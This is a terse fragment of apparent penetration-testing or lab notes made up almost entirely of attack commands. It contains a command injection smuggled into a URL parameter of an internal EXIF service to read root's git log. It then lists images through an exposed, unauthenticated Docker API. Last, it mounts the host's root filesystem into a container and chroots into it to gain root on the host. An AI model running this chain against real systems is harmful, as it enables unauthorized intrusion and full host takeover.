```
<http://api-dev-backup:8080/exif?url=;git> --git-dir  /root/.git/ log
```

Remote list docker images on the server:
```
docker -H 10.10.142.13:2375 images
```

Mount remote image and become root in docker:
```
docker -H 10.10.142.13:2375 run -v /:/mnt --rm -it frontend chroot /mnt sh
```